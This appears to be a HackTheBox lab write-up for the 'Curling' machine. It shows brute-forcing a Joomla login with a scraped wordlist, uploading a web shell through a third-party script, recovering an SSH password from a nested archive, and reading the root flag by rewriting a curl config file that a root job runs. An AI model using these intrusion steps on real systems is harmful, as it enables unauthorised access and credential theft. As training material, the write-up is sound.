# Curling

Back on the HackTheBox ting again. 

So we start this box as we normally do, with an Nmap scan so we know what we're up against.

```
nmap -sC -sV --top-ports 10000 -vvvv -n 10.10.10.150 -oA Curling
```

Let's check the results.

```
Host: 10.10.10.150 ()   
Ports: 22/open/tcp//ssh//OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)/
80/open/tcp//http//Apache httpd 2.4.29 ((Ubuntu))/      
Ignored State: closed (8304)
```

OK, so we have an Apache server and SSH, let's check out .

```
curl -X GET http://10.10.10.150
```

OK, so we have a login form, some blog type posts, and what appears to be a Joomla installation (so shells soon?(tm))

There's a pretty serious hint as the title of the page that we should probably pay attention to. 

![image](images/curling01.png)

So I guess we want to use Cewl to scrape this page for credentials. (it's already installed into Kali) 

Cool, lets do that.

```
cewl http://10.10.10.150/ > cewl_list
```

Now we can use the list that was generated as part of a Python script or an Intruder payload.

Checking out the list there are some strings that look like usernames, that'll save us some time bruteforcing this password.

```
import requests

with open("cewl_list") as wordlist:
    for word in wordlist:
        req = request.post("http://10.10.10.150/", data={"username":"Floris", "password": word }
        status = req.status_code
        
```

Let's let that run for a while, and go back to the site and see if we can't just figure out the username/password by looking around (we already picked up one "username" from one of the blog posts that we're using in the above script.

While we're doing that we can also run a wfuzz on the target see what else we can find.

```
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.10.150/FUZZ
```

We can also check for some specific file extensions while we're there:

```
http://10.10.10.150/FUZZ.txt
http://10.10.10.150/FUZZ.php
```

That should find any low hanging fruit for us to plunder.

Checking out the results, we can see some interesting endpoints that we should probably be checking out. Namely the one named "secret.txt".

It looks like a password. Is it encoded?

Fire up dev-tools in your browser:

```
atob("contents of secret.txt")
```

It was encoded. 

OK, so we have a login, and what appears to be a password. Let's see if they work on the login form.

![image](images/curling02.png)

Yup.

As a hacker in a 90's movie might say, we're in. 

Now it's time to drop a shell on this thing.

Googling around it appears that the version of Joomla that's being used is vulnerable to RFI (remote file inclusion), so let's upload a "shell" and get ourselves some enumeration capabilities. 

```
https://github.com/rootphantomer/hack_tools_for_me/blob/master/Joomla-Shell-Upload.py
```

That'll do nicely. 

All we have to do is change the username/password and provide it with the address of the remote machine. So we'll go right ahead and do that thing. 

Once the script has completed it will spit out the endpoint where it's managed to upload a "shell".

```
/templates/beez3/jsstrings.php?x=
```

Head over there and start typing commands as a parameter. Let's figure out what's going on with this box.

Sniffing around we can see a few files in the users home folder (although we can't read/write all of them because we're only the www-data user)

Spent about 20 minutes trying to get various shells to pop, nothing is really working, so instead of wasting any more time we can just move on to the files that we know we already have access to and see what's going on with them.

The most interesting file is called `password_backup.txt`...

Yeah... think we're going to want to take a closer look at that one...

We can get a nice serialized version of the data with the following as our parameter in our "shell" 

```
base64 /home/floris/password_backup
```

Sweet, lets take a look at that file in an editor and see what's what. 

... Just looks like a blob of base64... Let's change that. 

```
base64 -d password_backup | xxd -r
```

```
root@kali:pts/1-> /root > the-bible > IMPORTANTE > HackTheBox > Curling (0)
> base64 -d password_backup | xxd -r
BZh91AY&SYHAP)ava:4NnT#@%`
"n                         z@i4hdi9hQdh4i5nh*}y.<~x>    sVTzHߢ1V`Fs
  ۇ7j:XdRk )p7۫;9PCYP    HB*     G U@rrE8PH#
```

OK, so that doesn't make much sense, it's basically nonsense characters, but we can potentially still get some information out of this thing. 

Using the first three characters of the initial string is 'BZh', can we divine the correct file extension from that?

Off to Gary Keslers awesome list of file extensions to find out!

```
https://www.garykessler.net/library/file_sigs.html
```
Awesome we got a hit straight away, no mucking about. "BZh" appears to be the hex signature for a BZ2 archive file. 

OK, so lets modify our initial xxd string and output to bz2 and test the theory. 

```
base64 -d password_backup | xxd -r > archive.bz2
```

Now run file on it to double check that we've got the right extension type.

Then we can start unzipping!

This was immediately obvious to me what was going on because I did the challenges at [Overthewire.org](http://overthewire.org), and if you've done them you know what's about to happen here.

Zip-ception!

Just keep running "file" then whatever extraction method is best suited to the file type to unzip the file until you end up with a "password.txt" file. 

Shweet, where does this password go then?

Well we've been looking at the website so far, and we've not really looked at the SSH. So...

```
ssh floris@10.10.10.150
```
When prompted for the password give it the one that we just hijacked from the zip archives.

![image](images/curling03.png)

Aww yiss.png

We have an SSH shell, and joy of joys it actually has /bin/bash as the default so we have tab completion and such. Yay!

OK, so now we can grab the "user.txt" file and check out the rest of the things we weren't able to access earlier on, start doing some proper enumeration. 

Cron appears to be running, but we can't see what `root` is running due to permissions. We can check out the `cron.` files and see if there is anything interesting in any of those. 

```
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/
/etc/crontab
```

`crontab` tells us that we should be looking at the daily, hourly, and weekly directories for additional information on what's being ran, so we'll go ahead and do just that. 

We can't really do much with any of the stuff in these cron(s) but we'll keep sniffing around and see what we can't find.

```
sudo -l
```

Nope.jpg

Nothing running under sudo, so we can't pop something that way.

OK, so let's go back to our normal enum:

- Home folder(s)
- crontabs
- sudo permissions
- General system information
- SUID binaries


Last things first, are there any SUID binaries we can mess around with?

```
find / -perm -4000 2>/dev/null
```

While we're here let's just check and see that we aren't inside a docker image. 

```
cat /proc/1/cgroup
```

![image](images/curling03.png)

Noice, we're good to go. If we were inside a docker container that would have some pretty obvious strings in it denoting the docker environment. 

OK, so nothing so far, can we see what OS are we working on? 

```
cat /etc/issue
Ubuntu 16.04 LTS
```

OK, so an up-to-date OS, what about the kernel?

```
uname -r
4.15.0-22-generic
```

And a relatively up-to-date kernel.

OK, so no joy there but it's always worth a look.  Anything else in the home folder? 

![image](images/curling04.png)

So it's not even worth checking out the `.bash_history` file because it's soft linked to /dev/null, meaning it will only have the commands from the current session (i.e. our commands)

The "admin-area" directory contains two files, which are actually a hint (now that I've solved it) as to what to do next. 

The first file "input" has the following content:

```
url = "http://127.0.0.1"
```

The second file, "report", has what appears to be a curl pull from the website which we popped to gain access to the box. I won't reprint it for the sake of clarity, but it even comes back as a .html file when you run `file` on it. 

OK, so why is this a hint?

Well if we check out some tutorials on `curl` we can see that there is an option `-K` which allows us to pass a configuration file into our `curl` command, like so:

```
curl -K input.txt website.com
```

[Link for above command](https://ec.haxx.se/cmdline-configfile.html)

So it looks like there might be something using a configuration file to run `curl` commands. And since the box is called "Curling" we're probably in the right area to start researching. 

Digging around for .py files is probably a good place to start.

```
find / -name "*.py" 2>/dev/null
```

Then just start cutting down the things we don't need using `grep -v` 

Unfortunately that's a bit of a rabbit hole, but hey, we're learning things about enumeration and cutting down the signal to noise ratio, so it's all good!

Let's go back to that "admin-area" folder and take another look at the files in there (in my experience with these boxes things are left there for a reason, so don't ignore them)

So we have two files, one is a text file, or technically a configuration file that we can pass in to `curl`. The second appears to be the result of running `curl -K` and using the "input" file to determine what to do. 

All it's doing is pulling back the URL for localhost and the Apache server we've already looked at. So what does that mean? Let's play around with some different things and see if we can't get it to do something it shouldn't. 

```
date
```

This is the key.

Something is definitely running these files. 

Run that `date` command, make a note of the time, then run:

```
ls -la
```

Give it 60 seconds.

Now run it again. 

![image](images/curling05.png)

And just for good measure. 

![image](images/curling06.png)

OK, so lets write a little Bash script to check what's running this thing. 

```
#!/bin/bash

echo "Grabbing ps aux snapshot #1"
ps aux > /tmp/.grab01
sleep 60
echo "Grabbing ps aux snapshot #2"
ps aux > /tmp/.grab02

diff /tmp/.grab01 /tmp/.grab02
```

Let's run that a few times and see what happens. 

Spoiler alert. Nothing. But at least we know how to diff running processes now #AlwaysLearning.

OK, let's take another look at those files, because there is something I missed earlier. We have write permission. 

```
echo 'url = "http://127.0.0.1/index.php"' > input
```

That appeared to work, but we need to make sure that it actually did something with our input. 

```
echo 'url = "http://127.0.0.1/root/root.txt"' > input
```

We know that `/root/root.txt` isn't going to resolve on this host, so if we give it that (or anything that we know won't resolve) we can check the output of the "report" file and see if our changes to "input" were reflected. 

![image](images/curling07.png)

OK, so our changes are having an effect. 

So what if...

```
echo 'url = "file:///root/root.txt"' > input
```

Winning.jpg

That worked a treat! We have a root flag! 

But can we get a full shell back? OSCP style! (Stay tuned to find out!)

---

TODO: get full shell
